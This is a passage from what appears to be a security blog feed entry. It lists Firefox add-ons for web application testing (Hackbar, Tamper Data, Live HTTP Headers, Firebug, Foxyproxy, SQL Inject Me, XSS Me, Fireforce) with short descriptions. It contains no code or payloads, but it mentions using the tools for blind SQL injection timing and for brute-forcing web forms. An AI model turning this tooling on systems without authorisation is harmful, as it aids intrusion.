&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar/"&gt;Hackbar&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This addon allows us to calculate common types of hashes and provides us
 with some common encryption methods. It also allows us to edit post
data and referrer on fly.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/?src=search"&gt;Tamper Data&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This addon becomes your best friend when it comes to editing POST or GET
 requests. This particular addon eliminates the use of intercept proxies
 when the job is to manually modify the request headers and post data.
It also displays the time taken for a response to come from webserver,
which is helpful in Blind SQLi.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/?src=search"&gt;Live HTTP Headers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This addon is another utility to play with the headers. It allows us to
repeat HTTP requests by slightly modifying the parameters.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/firebug/?src=search"&gt;Firebug&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The most popular addon among web developers. It allows you to edit HTML
code in your browser, provides interface for playing with cookies, js
console and many more features. It is better to add Flash firebug also
which gives the capability to edit AS3 files in the browser itself.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/?src=search"&gt;Foxyproxy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Though this addon doesn't provide any active service in vulnerability
assessment, it helps a lot in a passive manner. It provides an easy
interface for switching between different proxies. We can also whitelist
 and blacklist urls. It even has the facility to automatically switch
between proxies based on the predefined url matchings.&lt;/p&gt;
&lt;p&gt;Even though my list officially ends here, I would like to add two addons provided by Security Compass for firefox. One is &lt;strong&gt;SQL inject me&lt;/strong&gt; and the other one is &lt;strong&gt;XSS Me&lt;/strong&gt;. Their functionality is very clear from their names.&lt;/p&gt;
&lt;p&gt;UPDATE - I recently came across another addon called&amp;nbsp; &lt;strong&gt;Fireforce&lt;/strong&gt; which helps in bruteforcing web application forms.&lt;/p&gt;</content><category term="info"></category></entry></feed>